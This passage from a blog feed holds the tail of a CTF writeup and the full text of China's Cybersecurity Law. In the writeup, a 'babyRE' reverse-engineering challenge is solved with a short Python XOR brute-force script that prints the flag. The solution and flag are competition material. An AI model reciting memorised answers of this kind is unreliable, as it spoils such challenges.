class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="re"><a href="#re" class="headerlink" title="re"></a>re</h3><h4 id="babyRE："><a href="#babyRE：" class="headerlink" title="babyRE："></a>babyRE：</h4><p>下载文件之后发现是Snap的程序，找到他的官网<a href="https://snap.berkeley.edu/snap/snap.html#%E5%9C%A8%E7%BA%BF%E5%AF%BC%E5%85%A5%E6%96%87%E4%BB%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89%E4%BA%9B%E5%8F%98%E9%87%8F%E5%92%8C%E5%87%BD%E6%95%B0%E5%91%BD%E5%90%8D%E4%B8%8D%E8%A7%84%E8%8C%83%EF%BC%8C%E5%B0%86%E5%85%B6%E8%A7%84%E8%8C%83%E5%8C%96%EF%BC%8C%E5%8F%91%E7%8E%B0">https://snap.berkeley.edu/snap/snap.html#在线导入文件，发现有些变量和函数命名不规范，将其规范化，发现</a></p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135150.png" style="zoom:67%;" /><p>此为初始化函数，相当于初始化数组，后发现</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/20230528135240.png" style="zoom: 67%;" /><p>将输入的字符第一个与前一个进行^ 操作，第二个与第一个进行^ 以此类推.</p><p>编写脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">74</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">76</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">86</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">82</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">85</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>str1 <span class="token operator">=</span> <span class="token string">'f'</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>str1<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            str1 <span class="token operator">=</span> str1 <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><blockquote><p> flag{12307bbf-9e91-4e61-a900-dd26a6d0ea4c}</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DebuGGerrr-战队WRITEUP&quot;&gt;&lt;a href=&quot;#DebuGGerrr-战队WRITEUP&quot; class=&quot;headerlink&quot; title=&quot;DebuGGerrr 战队WRITEUP&quot;&gt;&lt;/a&gt;DebuGGerrr 战队WRITEUP&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="CTF" scheme="https://shierjinghuang.github.io/categories/CTF/"/>
    
    
    <category term="CISCN" scheme="https://shierjinghuang.github.io/tags/CISCN/"/>
    
  </entry>
  
  <entry>
    <title>网络安全法</title>
    <link href="https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/04/12/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/</id>
    <published>2023-04-12T08:32:31.000Z</published>
    <updated>2023-04-25T07:36:09.205Z</updated>
    
    <content type="html"><![CDATA[<h4 id="目-录"><a href="#目-录" class="headerlink" title="目 录"></a>目 录</h4><p>[TOC]</p><h4 id="第一章-总-则"><a href="#第一章-总-则" class="headerlink" title="第一章 总 则"></a>第一章 总 则</h4><p><strong>第一条</strong> 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 </p><p><strong>第二条</strong> 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 </p><p><strong>第三条</strong> 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、 依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 </p><p><strong>第四条</strong> 国家制定并不断完善网络安全战略，明确保障网络安全的基本要 求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 </p><p><strong>第五条</strong> 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 </p><p><strong>第六条</strong> 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 </p><p><strong>第七条</strong> 国家积极开展网络空间治理、网络技术研发和标准制定、打击网 络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 </p><p><strong>第八条</strong> 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 </p><p><strong>第九条</strong> 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 </p><p><strong>第十条</strong> 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p><strong>第十一条</strong> 网络相关行业组织按照章程，加强行业自律，制定网络安全行 为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 </p><p><strong>第十二条</strong> 国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。 </p><p><strong>第十三条</strong> 国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。 </p><p><strong>第十四条</strong> 任何个人和组织有权对危害网络安全的行为向网信、电信、公 安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。 有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。 </p><h4 id="第二章-网络安全支持与促进"><a href="#第二章-网络安全支持与促进" class="headerlink" title="第二章 网络安全支持与促进"></a>第二章 网络安全支持与促进</h4><p><strong>第十五条</strong> 国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家 标准、行业标准的制定。 </p><p><strong>第十六条</strong> 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投 入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构 和高等学校等参与国家网络安全技术创新项目。 </p><p><strong>第十七条</strong> 国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。 </p><p><strong>第十八条</strong> 国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。 国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。 </p><p><strong>第十九条</strong> 各级人民政府及其有关部门应当组织开展经常性的网络安全宣 传教育，并指导、督促有关单位做好网络安全宣传教育工作。大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。 </p><p><strong>第二十条</strong> 国家支持企业和高等学校、职业学校等教育培训机构开展网络 安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。 </p><h4 id="第三章-网络运行安全"><a href="#第三章-网络运行安全" class="headerlink" title="第三章 网络运行安全"></a>第三章 网络运行安全</h4><p>第一节 一般规定 </p><p><strong>第二十一条</strong> 国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任； </p><p>（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施； </p><p>（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月； </p><p>（四）采取数据分类、重要数据备份和加密等措施； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第二十二条</strong> 网络产品、服务应当符合相关国家标准的强制性要求。网络 产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或 者当事人约定的期限内，不得终止提供安全维护。网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得 同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。 </p><p><strong>第二十三条</strong> 网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销 售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。 </p><p><strong>第二十四条</strong> 网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提 供真实身份信息的，网络运营者不得为其提供相关服务。国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。 </p><p><strong>第二十五条</strong> 网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。 </p><p><strong>第二十六条</strong> 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。 </p><p><strong>第二十七条</strong> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网 络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。 </p><p><strong>第二十八条</strong> 网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助</p><p><strong>第二十九条</strong> 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。 </p><p><strong>第三十条</strong> 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。 第二节 关键信息基础设施的运行安全 </p><p><strong>第三十一条</strong> 国家对公共通信和信息服务、能源、交通、水利、金融、公 共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。 国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施 保护体系。 </p><p><strong>第三十二条</strong> 按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。 </p><p><strong>第三十三条</strong> 建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。 </p><p><strong>第三十四条</strong> 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务： </p><p>（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查； </p><p>（二）定期对从业人员进行网络安全教育、技术培训和技能考核； </p><p>（三）对重要系统和数据库进行容灾备份； </p><p>（四）制定网络安全事件应急预案，并定期进行演练； </p><p>（五）法律、行政法规规定的其他义务。 </p><p><strong>第三十五条</strong> 关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。 </p><p><strong>第三十六条</strong> 关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。 </p><p><strong>第三十七条</strong> 关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。 </p><p><strong>第三十八条</strong> 关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测 评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。 </p><p><strong>第三十九条</strong> 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施： </p><p>一 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>二 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力</p><p>三 促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享</p><p>四 对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。 </p><h4 id="第四章-网络信息安全"><a href="#第四章-网络信息安全" class="headerlink" title="第四章 网络信息安全"></a>第四章 网络信息安全</h4><p><strong>第四十条</strong> 网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。 </p><p><strong>第四十一条</strong> 网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。 </p><p><strong>第四十二条</strong> 网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的 情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。 </p><p><strong>第四十三条</strong> 个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。 </p><p><strong>第四十四条</strong> 任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。 </p><p><strong>第四十五条</strong> 依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。 </p><p><strong>第四十六条</strong> 任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。 </p><p><strong>第四十七条</strong> 网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十八条</strong> 任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。 </p><p><strong>第四十九条</strong> 网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。 网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p><strong>第五十条</strong> 国家网信部门和有关部门依法履行网络信息安全监督管理职责， 发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息， 应当通知有关机构采取技术措施和其他必要措施阻断传播。 </p><h4 id="第五章-监测预警与应急处置"><a href="#第五章-监测预警与应急处置" class="headerlink" title="第五章 监测预警与应急处置"></a>第五章 监测预警与应急处置</h4><p><strong>第五十一条</strong> 国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。 </p><p><strong>第五十二条</strong> 负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。 </p><p><strong>第五十三条</strong> 国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。 </p><p><strong>第五十四条</strong> 网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害， 采取下列措施： </p><p>（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测； </p><p>（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度； </p><p>（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。 </p><p><strong>第五十五条</strong> 发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息</p><p><strong>第五十六条</strong> 省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。 </p><p><strong>第五十七条</strong> 因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有 关法律、行政法规的规定处置。 </p><p><strong>第五十八条</strong> 因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。 </p><h4 id="第六章-法律责任"><a href="#第六章-法律责任" class="headerlink" title="第六章 法律责任"></a>第六章 法律责任</h4><p><strong>第五十九条</strong> 网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。 </p><p><strong>第六十条</strong> 违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危 害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款： </p><p>（一）设置恶意程序的； </p><p>（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的； </p><p>（三）擅自终止为其产品、服务提供安全维护的。 </p><p><strong>第六十一条</strong> 网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十二条</strong> 违反本法第二十六条规定，开展网络安全认证、检测、风险 评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业 整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人 员和其他直接责任人员处五千元以上五万元以下罚款。 </p><p><strong>第六十三条</strong> 违反本法第二十七条规定，从事危害网络安全的活动，或者 提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。 单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。 </p><p><strong>第六十四条</strong> 网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非 法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法 所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。 </p><p><strong>第六十五条</strong> 关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十六条</strong> 关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予 警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。 </p><p><strong>第六十七条</strong> 违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。 </p><p><strong>第六十八条</strong> 网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的， 处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。 </p><p><strong>第六十九条</strong> 网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款</p><p>（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的； </p><p>（二）拒绝、阻碍有关部门依法实施的监督检查的； </p><p>（三）拒不向公安机关、国家安全机关提供技术支持和协助的。 </p><p><strong>第七十条</strong> 发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。 </p><p><strong>第七十一条</strong> 有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。 </p><p><strong>第七十二条</strong> 国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。 </p><p><strong>第七十三条</strong> 网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。 </p><p><strong>第七十四条</strong> 违反本法规定，给他人造成损害的，依法承担民事责任。违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯 罪的，依法追究刑事责任。 </p><p><strong>第七十五条</strong> 境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危 害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财 产或者其他必要的制裁措施。 </p><h4 id="第七章-附-则"><a href="#第七章-附-则" class="headerlink" title="第七章 附 则"></a>第七章 附 则</h4><p><strong>第七十六条</strong> 本法下列用语的含义： </p><p>（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。 </p><p>（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。 </p><p>（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。 </p><p>（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。 </p><p>（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、 身份证件号码、个人生物识别信息、住址、电话号码等。 </p><p><strong>第七十七条</strong> 存储、处理涉及国家秘密信息的网络的运行安全保护，除应 当遵守本法外，还应当遵守保密法律、行政法规的规定。 </p><p><strong>第七十八条</strong> 军事网络的安全保护，由中央军事委员会另行规定。 </p><p><strong>第七十九条</strong> 本法自 2017 年 6 月 1 日起施行。</p>]]></content>
    
    
      
      
